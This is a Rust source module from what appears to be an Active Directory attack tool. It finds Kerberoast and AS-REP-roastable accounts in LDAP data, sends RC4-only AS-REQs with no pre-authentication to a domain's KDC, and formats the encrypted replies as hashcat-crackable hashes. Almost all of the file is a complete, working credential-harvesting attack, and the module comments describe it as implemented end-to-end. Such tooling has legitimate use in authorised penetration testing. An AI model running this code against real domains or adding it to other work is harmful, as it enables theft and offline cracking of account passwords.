//! Kerberos roasting layer.
//!
//! LDAP finds the candidates (SPN → Kerberoast, DONT_REQ_PREAUTH → AS-REP roast).
//! This crate turns an AS-REP-roastable account into a crackable hash by sending a raw
//! pre-auth-less AS-REQ to the KDC (messages built on picky-krb) and formatting the
//! reply for hashcat. AS-REP roasting needs no credentials, so it is implemented in
//! full and end-to-end. Kerberoast (TGS-REQ) needs a TGT — see the note on `kerberoast`.

use adhammer_core::object::uac;
use adhammer_core::snapshot::Snapshot;
use anyhow::{anyhow, bail, Result};

use picky_asn1::bit_string::BitString;
use picky_asn1::date::Date;
use picky_asn1::restricted_string::Ia5String;
use picky_asn1::wrapper::{
    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag7,
    ExplicitContextTag8, GeneralStringAsn1, IntegerAsn1, Optional,
};
use picky_krb::constants::types::{AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST};
use picky_krb::data_types::{KerberosTime, PrincipalName};
use picky_krb::messages::{AsRep, AsReq, KdcReq, KdcReqBody};

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

mod tgs;
pub use tgs::{get_tgt, roast_spn, Tgt};

/// Kerberos encryption type numbers (RFC 3961/4120).
pub const ETYPE_RC4_HMAC: u8 = 23;
pub const ETYPE_AES256: u8 = 18;

/// A roastable principal discovered from the snapshot.
#[derive(Clone, Debug)]
pub struct Candidate {
    pub sam: String,
    pub realm: String,
    pub spn: Option<String>, // set for Kerberoast, None for AS-REP roast
}

/// Enumerate roasting candidates from LDAP data — no network.
pub fn candidates(snap: &Snapshot, realm: &str) -> (Vec<Candidate>, Vec<Candidate>) {
    let mut kerberoast = Vec::new();
    let mut asrep = Vec::new();
    for o in snap.iter_class("user") {
        if o.uac() & uac::ACCOUNTDISABLE != 0 {
            continue;
        }
        let Some(sam) = o.one("sAMAccountName") else { continue };
        if let Some(spn) = o.all("servicePrincipalName").first() {
            kerberoast.push(Candidate { sam: sam.into(), realm: realm.into(), spn: Some(spn.clone()) });
        }
        if o.uac() & uac::DONT_REQ_PREAUTH != 0 {
            asrep.push(Candidate { sam: sam.into(), realm: realm.into(), spn: None });
        }
    }
    (kerberoast, asrep)
}

// ---------------------------------------------------------------------------
// AS-REQ construction (pre-auth-less, RC4-first for a hashcat-18200 hash).
// ---------------------------------------------------------------------------

pub(crate) fn krb_string(s: &str) -> GeneralStringAsn1 {
    GeneralStringAsn1::from(Ia5String::from_string(s.to_owned()).unwrap())
}

pub(crate) fn principal(name_type: u8, parts: &[&str]) -> PrincipalName {
    let strings = parts
        .iter()
        .map(|p| GeneralStringAsn1::from(Ia5String::from_string((*p).to_owned()).unwrap()))
        .collect::<Vec<_>>();
    PrincipalName {
        name_type: ExplicitContextTag0::from(IntegerAsn1(vec![name_type])),
        name_string: ExplicitContextTag1::from(Asn1SequenceOf::from(strings)),
    }
}

/// Build an AS-REQ for `user@realm` with no PA-ENC-TIMESTAMP, requesting RC4 so the
/// returned AS-REP enc-part is an offline-crackable hashcat 18200 hash.
fn build_as_req(user: &str, realm: &str) -> AsReq {
    let mut nonce = [0u8; 4];
    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut nonce);
    nonce[0] &= 0x7f; // keep the ASN.1 INTEGER positive

    let body = KdcReqBody {
        // forwardable | renewable | canonicalize
        kdc_options: ExplicitContextTag0::from(BitStringAsn1::from(BitString::with_bytes(vec![
            0x40, 0x81, 0x00, 0x00,
        ]))),
        cname: Optional::from(Some(ExplicitContextTag1::from(principal(NT_PRINCIPAL, &[user])))),
        realm: ExplicitContextTag2::from(GeneralStringAsn1::from(
            Ia5String::from_string(realm.to_owned()).unwrap(),
        )),
        sname: Optional::from(Some(ExplicitContextTag3::from(principal(
            NT_SRV_INST,
            &["krbtgt", realm],
        )))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(KerberosTime::from(Date::new(2037, 9, 13, 2, 48, 5).unwrap())),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(IntegerAsn1(nonce.to_vec())),
        // RC4 only ⇒ hashcat 18200. AES-only accounts will yield a KDC error instead.
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![ETYPE_RC4_HMAC])])),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: Optional::from(None),
    };

    AsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
        padata: Optional::from(None),
        req_body: ExplicitContextTag4::from(body),
    })
}

// ---------------------------------------------------------------------------
// Network exchange over TCP/88 (4-byte big-endian length prefix per RFC 4120).
// ---------------------------------------------------------------------------

/// Current UTC as a Kerberos GeneralizedTime (second granularity).
pub(crate) fn now_kerberos_time() -> KerberosTime {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64;
    let (y, m, d) = civil_from_days(secs.div_euclid(86_400));
    let tod = secs.rem_euclid(86_400);
    KerberosTime::from(
        Date::new(y, m, d, (tod / 3600) as u8, ((tod % 3600) / 60) as u8, (tod % 60) as u8).unwrap(),
    )
}

/// A far-future Kerberos ticket expiry (`till`). Must be after the start time or the KDC
/// rejects the request with KDC_ERR_NEVER_VALID.
pub(crate) fn far_future_time() -> KerberosTime {
    KerberosTime::from(Date::new(2037, 9, 13, 2, 48, 5).unwrap())
}

/// days since 1970-01-01 → (year, month, day). Howard Hinnant's civil_from_days.
fn civil_from_days(z: i64) -> (u16, u8, u8) {
    let z = z + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    ((y + i64::from(m <= 2)) as u16, m as u8, d as u8)
}

pub(crate) async fn kdc_exchange(kdc: &str, request: &[u8]) -> Result<Vec<u8>> {
    let addr = if kdc.contains(':') { kdc.to_string() } else { format!("{kdc}:88") };
    let mut stream = TcpStream::connect(&addr).await?;

    let mut framed = Vec::with_capacity(request.len() + 4);
    framed.extend_from_slice(&(request.len() as u32).to_be_bytes());
    framed.extend_from_slice(request);
    stream.write_all(&framed).await?;

    let mut len = [0u8; 4];
    stream.read_exact(&mut len).await?;
    let n = u32::from_be_bytes(len) as usize;
    if n == 0 || n > 4 * 1024 * 1024 {
        bail!("implausible KDC response length {n}");
    }
    let mut buf = vec![0u8; n];
    stream.read_exact(&mut buf).await?;
    Ok(buf)
}

/// Perform an AS-REP roast against one candidate; returns the hashcat 18200 line.
/// No credentials required — relies on the account's DONT_REQ_PREAUTH flag.
pub async fn asrep_roast(c: &Candidate, kdc: &str) -> Result<String> {
    let raw = picky_asn1_der::to_vec(&build_as_req(&c.sam, &c.realm))
        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
    let resp = kdc_exchange(kdc, &raw).await?;

    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
        anyhow!("no AS-REP (KDC returned an error — pre-auth required, or RC4 disabled): {e}")
    })?;

    let enc = &as_rep.0.enc_part.0;
    let etype = enc.etype.0 .0.iter().fold(0u32, |a, &b| (a << 8) | b as u32);
    if etype != ETYPE_RC4_HMAC as u32 {
        bail!("AS-REP came back etype {etype}, not RC4 — account is AES-only");
    }
    Ok(format_asrep(&c.sam, &c.realm, &enc.cipher.0 .0))
}

// ---------------------------------------------------------------------------
// hashcat formatters.
// ---------------------------------------------------------------------------

/// hashcat `-m 18200` line for an AS-REP (etype 23):
/// `$krb5asrep$23$user@REALM:<checksum16>$<edata>`
pub fn format_asrep(user: &str, realm: &str, enc_part: &[u8]) -> String {
    let cut = 16.min(enc_part.len());
    format!(
        "$krb5asrep$23${}@{}:{}${}",
        user,
        realm,
        hex::encode(&enc_part[..cut]),
        hex::encode(&enc_part[cut..])
    )
}

/// hashcat `-m 13100` line for a TGS-REP (Kerberoast, etype 23):
/// `$krb5tgs$23$*user$REALM$spn*$<checksum16>$<edata>`
pub fn format_tgs(user: &str, realm: &str, spn: &str, enc_part: &[u8]) -> String {
    let cut = 16.min(enc_part.len());
    format!(
        "$krb5tgs$23$*{}${}${}*${}${}",
        user,
        realm,
        spn,
        hex::encode(&enc_part[..cut]),
        hex::encode(&enc_part[cut..])
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The AS-REQ we build is valid DER and round-trips through the schema — proves the
    /// message construction without needing a live KDC.
    #[test]
    fn as_req_roundtrips() {
        let req = build_as_req("myuser", "EXAMPLE.COM");
        let raw = picky_asn1_der::to_vec(&req).expect("encode");
        let decoded: AsReq = picky_asn1_der::from_bytes(&raw).expect("decode");
        assert_eq!(picky_asn1_der::to_vec(&decoded).unwrap(), raw);
    }

    #[test]
    fn asrep_hashcat_format() {
        let h = format_asrep("svc", "CORP.LOCAL", &[0xaa; 32]);
        assert!(h.starts_with("$krb5asrep$23$svc@CORP.LOCAL:"));
        assert!(h.contains(&"aa".repeat(16)));
    }
}
